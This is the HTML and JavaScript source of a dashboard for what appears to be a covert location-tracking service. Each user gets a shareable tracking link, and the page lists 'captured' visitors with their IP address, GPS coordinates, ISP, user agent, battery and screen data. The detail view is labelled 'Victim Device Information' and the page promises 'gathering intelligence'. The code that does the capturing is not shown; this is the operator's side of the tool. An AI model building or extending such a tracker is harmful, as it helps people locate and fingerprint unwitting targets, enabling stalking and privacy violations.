<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Dashboard - Live Tracker</title><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');:root{--primary-accent:#6a11cb;--secondary-accent:#2575fc;--text-light:#f0f0f0;--text-muted:#a0a0a0;--card-bg:rgba(255, 255, 255, 0.05);--card-border:rgba(255, 255, 255, 0.1);--body-bg:linear-gradient(160deg,#0f0c29 0%,#302b63 50%,#24243e 100%)}body{font-family:'Poppins',sans-serif;background:var(--body-bg);color:var(--text-light);height:100vh;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;transition:background .4s,color .4s}body.super-dark-mode{--body-bg:#000000;--card-bg:rgba(26, 26, 26, 0.8);--card-border:rgba(40, 40, 40, 1)}*{box-sizing:border-box;margin:0;padding:0}.container{width:100%;height:100%;padding:25px;display:flex;flex-direction:column;overflow-y:auto}.header{margin-bottom:30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:15px;animation:fadeInDown .5s ease-out}@keyframes fadeInDown{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}h1{font-weight:700;font-size:clamp(1.5rem,5vw,1.8rem)}#welcome-username{background:linear-gradient(90deg,var(--primary-accent),var(--secondary-accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent}.controls-wrapper{display:flex;align-items:center;gap:15px}#logout-btn{padding:8px 16px;border-radius:8px;font-weight:600;cursor:pointer;transition:all .3s ease;border:1px solid var(--card-border);background:var(--card-bg);color:var(--text-muted)}#logout-btn:hover{background:rgba(255,255,255,0.1);color:var(--text-light)}.link-section,.location-card,#message-area{padding:25px;border-radius:15px;margin-bottom:30px;background:var(--card-bg);border:1px solid var(--card-border);backdrop-filter:blur(10px);animation:fadeInUp .5s .2s ease-out backwards}@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}h2{margin-top:0;margin-bottom:20px;font-size:1.4rem;font-weight:600}.share-link-wrapper{display:flex;align-items:center;gap:10px;padding:8px;border-radius:10px;background-color:rgba(0,0,0,.2)}#share-link{flex-grow:1;padding:12px;font-size:1rem;background:none;border:none;color:var(--text-light);font-family:'Poppins',sans-serif;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}#copy-btn{flex-shrink:0;padding:10px;border:none;border-radius:8px;cursor:pointer;transition:all .3s ease;background:var(--primary-accent);color:white}#copy-btn:hover{filter:brightness(1.2)}#copy-btn svg{width:20px;height:20px;vertical-align:middle}.locations-section{flex-grow:1;display:flex;flex-direction:column;animation:fadeInUp .5s .4s ease-out backwards}.locations-grid{display:grid;grid-template-columns:1fr;gap:20px}#message-area{text-align:center;margin:auto 0}#message-area svg{width:60px;height:60px;margin-bottom:20px;opacity:.5;filter:drop-shadow(0 0 10px var(--primary-accent))}#message-area h3{margin:0;font-size:1.2rem;font-weight:600}#message-area p{font-size:1rem;color:var(--text-muted)}.location-card{margin-bottom:0}.location-card:hover{transform:translateY(-5px);box-shadow:0 10px 25px rgba(0,0,0,.3)}.card-body{padding:20px;display:grid;grid-template-columns:100px 1fr;gap:10px 15px;align-items:center}.card-body .label{font-size:.9rem;color:var(--text-muted);font-weight:500}.card-body .value{font-size:.95rem;font-weight:400;word-break:break-all}.card-actions{margin-top:auto;padding:15px 20px;display:flex;justify-content:space-between;align-items:center;gap:15px;background-color:rgba(0,0,0,.2)}.map-link{color:#87CEEB;text-decoration:none;font-weight:600;display:flex;align-items:center;gap:8px;font-size:.9rem;transition:.3s}.map-link:hover{color:var(--text-light)}.map-link.disabled{color:#888;cursor:not-allowed;opacity:.5}.action-btn{padding:10px 20px;font-size:.9rem;border:none;border-radius:8px;font-weight:600;cursor:pointer;transition:all .3s ease;background:linear-gradient(90deg,var(--primary-accent),var(--secondary-accent));color:white}.action-btn:hover{transform:scale(1.05);box-shadow:0 5px 15px rgba(0,0,0,.3)}.theme-switch{position:relative;display:inline-block;width:50px;height:28px}.theme-switch input{opacity:0;width:0;height:0}.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#555;transition:.4s;border-radius:28px}.slider:before{position:absolute;content:"";height:20px;width:20px;left:4px;bottom:4px;background-color:white;transition:.4s;border-radius:50%}input:checked+.slider{background-color:var(--primary-accent)}input:checked+.slider:before{transform:translateX(22px)}.modal-overlay{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.6);justify-content:center;align-items:center;backdrop-filter:blur(5px)}.modal-overlay.active{display:flex}.modal-content{background:var(--card-bg);border:1px solid var(--card-border);margin:auto;padding:25px;width:90%;max-width:700px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.5);position:relative;animation:scaleIn .3s ease-out;display:flex;flex-direction:column;max-height:90vh}@keyframes scaleIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;padding-bottom:15px;border-bottom:1px solid var(--card-border)}.modal-header h3{margin:0;font-size:1.3rem;font-weight:600}.modal-close{color:var(--text-muted);font-size:28px;font-weight:700;cursor:pointer;line-height:1}.modal-close:hover{color:var(--text-light)}.modal-body{overflow-y:auto;padding-right:10px}.modal-body .detail-grid{display:grid;grid-template-columns:1fr;gap:10px}.modal-body .detail-item{display:grid;grid-template-columns:160px 1fr;align-items:center;background-color:rgba(0,0,0,.2);padding:12px 15px;border-radius:6px;border-left:3px solid var(--primary-accent);transition:background-color .2s}.modal-body .detail-item:hover{background-color:rgba(106,17,203,.1)}.modal-body .detail-label{font-weight:500;color:var(--text-muted);font-size:.9rem}.modal-body .detail-value{font-weight:400;color:var(--text-light);text-align:left;word-break:break-all;font-size:.9rem;font-family:monospace}.modal-footer{padding-top:20px;margin-top:auto;border-top:1px solid var(--card-border);display:flex;justify-content:flex-end}.copy-intel-btn{padding:10px 20px;font-size:.9rem;border:1px solid var(--card-border);border-radius:8px;font-weight:600;cursor:pointer;transition:all .3s ease;background-color:transparent;color:var(--text-muted)}.copy-intel-btn:hover{background-color:var(--primary-accent);color:white}</style></head><body><div class="container"><div class="header"><h1>Welcome, <span id="welcome-username"></span>!</h1><div class="controls-wrapper"><label class="theme-switch"><input type="checkbox" id="theme-toggle-checkbox"><span class="slider"></span></label><button id="logout-btn">Logout</button></div></div><div class="link-section"><h2>Your Tracking Link</h2><div class="share-link-wrapper"><input type="text" id="share-link" value="Generating..." readonly><button id="copy-btn" title="Copy Link"><svg id="copy-icon-normal" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5-.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3z"/></svg><svg id="copy-icon-success" style="display:none;" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16"><path d="M12.736 3.97a.733.733 0 0 1 1.047 0c.286.289.29.756.01 1.05L7.88 12.01a.733.733 0 0 1-1.065.02L3.217 8.384a.757.757 0 0 1 0-1.06.733.733 0 0 1 1.047 0l3.052 3.093 5.4-6.425a.247.247 0 0 1 .02-.022z"/></svg></button></div></div><div class="locations-section"><h2>Captured Locations</h2><div id="message-area" style="display:none;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><path d="M12 21C15.5 17.4 19 14.1764 19 10.2C19 6.22355 15.866 3 12 3C8.13401 3 5 6.22355 5 10.2C5 14.1764 8.5 17.4 12 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 12C13.1046 12 14 11.1046 14 10C14 8.89543 13.1046 8 12 8C10.8954 8 10 8.89543 10 10C10 11.1046 10.8954 12 12 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><h3>No Locations Captured Yet</h3><p>Share your tracking link to start gathering intelligence.</p></div><div id="locations-grid" class="locations-grid"></div></div></div><div id="intel-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3>Victim Device Information</h3><span class="modal-close">×</span></div><div class="modal-body"></div></div></div><script>let supabase;let loggedInUser=null;const welcomeUsername=document.getElementById("welcome-username");const shareLinkInput=document.getElementById("share-link");const copyBtn=document.getElementById("copy-btn");const copyIconNormal=document.getElementById("copy-icon-normal");const copyIconSuccess=document.getElementById("copy-icon-success");const logoutBtn=document.getElementById("logout-btn");const themeToggleCheckbox=document.getElementById("theme-toggle-checkbox");const messageArea=document.getElementById("message-area");const locationsGrid=document.getElementById("locations-grid");const allLocationsCache=[];async function initApp(){try{window.addEventListener("contextmenu",e=>e.preventDefault());const response=await fetch("/api/config");const config=await response.json();if(!config.supabaseUrl||!config.supabaseAnonKey)throw new Error("Config not loaded");supabase=window.supabase.createClient(config.supabaseUrl,config.supabaseAnonKey);const{data:{session}}=await supabase.auth.getSession();if(!session){window.location.href="login.html";return}loggedInUser=session.user;const userProfile=await setupUserProfile();if(userProfile){await displayDashboard(userProfile)}setupModal("intel-modal");themeToggleCheckbox.addEventListener("change",toggleTheme);copyBtn.addEventListener("click",copyShareLink);logoutBtn.addEventListener("click",signOutUser)}catch(err){console.error("Failed to init app:",err);messageArea.innerHTML='<h3>Initialization Failed</h3><p>Could not connect to the server.</p>';messageArea.style.display="block"}}function generateTrackerId(length=6){const chars="abcdefghijklmnopqrstuvwxyz0123456789";let result="";for(let i=0;i<length;i++){result+=chars.charAt(Math.floor(Math.random()*chars.length))}return result}async function setupUserProfile(){const{data:profile,error}=await supabase.from("users").select("*").eq("id_auth",loggedInUser.id).single();if(error&&error.code==="PGRST116"){const newUsername=(loggedInUser.email.split("@")[0]+Math.floor(Math.random()*100)).replace(/[^a-zA-Z0-9]/g,"");const newProfileData={id_auth:loggedInUser.id,username:newUsername,email:loggedInUser.email,password:"social_login",tracker_id:generateTrackerId()};const{data:newProfile,error:insertError}=await supabase.from("users").insert(newProfileData).select().single();if(insertError){console.error("Error creating profile:",insertError);alert("Could not create your user profile!");return null}return newProfile}else if(error){console.error("Error fetching profile:",error);return null}return profile}async function displayDashboard(userProfile){welcomeUsername.textContent=userProfile.username;applyTheme(userProfile.is_dark_mode);if(userProfile.tracker_id){const shareableLink=`${window.location.origin}/t/${userProfile.tracker_id}`;shareLinkInput.value=shareableLink}else{shareLinkInput.value="Could not generate link."}fetchLocations(userProfile.username)}async function fetchLocations(username){messageArea.style.display="none";locationsGrid.innerHTML="";const{data,error}=await supabase.from("locations").select("*").eq("tracked_by_username",username).order("created_at",{ascending:false});if(error){console.error("Error fetching locations:",error);messageArea.textContent=`Error fetching data: ${error.message}`;return}allLocationsCache.length=0;allLocationsCache.push(...data);if(data&&data.length>0){data.forEach(loc=>{const card=document.createElement("div");card.className="location-card";const capturedDate=(new Date(loc.created_at)).toLocaleString();const cardBodyHTML=`<div class="card-body"><span class="label">Captured At</span><span class="value">${capturedDate}</span><span class="label">IP Address</span><span class="value">${loc.ip_address||"N/A"}</span><span class="label">City</span><span class="value">${loc.city||"N/A"}</span></div>`;const cardActionsHTML=`<div class="card-actions"><a class="map-link ${!isLocationAvailable(loc)?"disabled":""}" href="${isLocationAvailable(loc)?`https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`:"javascript:void(0)"}" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 16s6-5.686 6-10A6 6 0 0 0 2 6c0 4.314 6 10 6 10zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6z"/></svg>View Map</a><button class="action-btn" data-location-id="${loc.id}">Device Info</button></div>`;card.innerHTML=cardBodyHTML+cardActionsHTML;locationsGrid.appendChild(card)})}else{messageArea.style.display="block"}locationsGrid.querySelectorAll(".action-btn").forEach(btn=>{btn.addEventListener("click",()=>showIntelModal(btn.dataset.locationId))})}async function signOutUser(){await supabase.auth.signOut();window.location.href="login.html"}function copyShareLink(){const originalHTML=copyBtn.innerHTML;const successHTML=copyIconSuccess.outerHTML;navigator.clipboard.writeText(shareLinkInput.value).then(()=>{copyBtn.innerHTML=successHTML;setTimeout(()=>{copyBtn.innerHTML=originalHTML},2e3)})}function setupModal(modalId){const modal=document.getElementById(modalId);const closeBtn=modal.querySelector(".modal-close");if(closeBtn)closeBtn.onclick=()=>modal.classList.remove("active");window.addEventListener("click",event=>{if(event.target==modal){modal.classList.remove("active")}}) }function applyTheme(isDark){document.body.className=isDark?"super-dark-mode":"";themeToggleCheckbox.checked=isDark}async function toggleTheme(){const newThemeState=themeToggleCheckbox.checked;applyTheme(newThemeState);try{await supabase.from("users").update({is_dark_mode:newThemeState}).eq("id_auth",loggedInUser.id)}catch(error){console.error("Failed to update theme in DB:",error)}}function isLocationAvailable(loc){const deniedValues=["Permission Denied","Pending..."];return!deniedValues.includes(loc.latitude)&&loc.latitude!==null}function showIntelModal(locationId){const modal=document.getElementById("intel-modal");const d=allLocationsCache.find(loc=>loc.id==locationId);if(!d)return;const deniedValues=["Permission Denied","Pending..."];const isLocAvail=!deniedValues.includes(d.latitude)&&d.latitude!==null;const locationString=isLocAvail?`${d.latitude}, ${d.longitude}`:d.latitude||"N/A";const timestamp=(new Date(d.created_at)).toISOString().replace("Z","+00:00").replace(".000","");const fields=[{label:"Timestamp",value:timestamp},{label:"IpAddress",value:d.ip_address||"N/A"},{label:"City",value:d.city||"N/A"},{label:"Region",value:d.region||"N/A"},{label:"Country",value:d.country||"N/A"},{label:"Location",value:locationString},{label:"Isp",value:d.isp||"N/A"},{label:"Timezone",value:d.timezone||"N/A"},{label:"UserAgent",value:d.user_agent||"N/A"},{label:"Platform",value:d.platform||"N/A"},{label:"Language",value:d.language||"N/A"},{label:"ScreenWidth",value:d.screen_width||null},{label:"ScreenHeight",value:d.screen_height||null},{label:"ColorDepth",value:d.color_depth||null},{label:"PixelDepth",value:d.pixel_depth||null},{label:"BatteryLevel",value:d.battery_level!==null?`${d.battery_level}%`:"N/A"},{label:"IsCharging",value:d.is_charging===null?"N/A":d.is_charging?1:0},{label:"CookiesEnabled",value:d.cookies_enabled===null?"N/A":d.cookies_enabled?1:0},{label:"DoNotTrack",value:d.do_not_track||"N/A"},{label:"HardwareConcurrency",value:d.hardware_concurrency||null}];let reportText="";let intelHTML='<div class="modal-content"><div class="modal-header"><h3>Victim Device Information</h3><span class="modal-close">×</span></div><div class="modal-body"><div class="detail-grid">';fields.forEach(field=>{reportText+=`${field.label}: ${field.value||"N/A"}\n`;intelHTML+=`<div class="detail-item"><span class="detail-label">${field.label}</span><span class="detail-value">${field.value||"N/A"}</span></div>`});intelHTML+='</div></div><div class="modal-footer"><button class="copy-intel-btn">Copy All Info</button></div></div>';modal.innerHTML=intelHTML;modal.classList.add("active");const copyIntelBtn=modal.querySelector(".copy-intel-btn");if(copyIntelBtn){copyIntelBtn.addEventListener("click",()=>{navigator.clipboard.writeText(reportText.trim()).then(()=>{copyIntelBtn.textContent="Copied!";setTimeout(()=>{copyIntelBtn.textContent="Copy All Info"},2e3)}).catch(err=>{console.error("Failed to copy info:",err);copyIntelBtn.textContent="Error!"})})}setupModal("intel-modal")}document.addEventListener("DOMContentLoaded",initApp);</script></body></html>
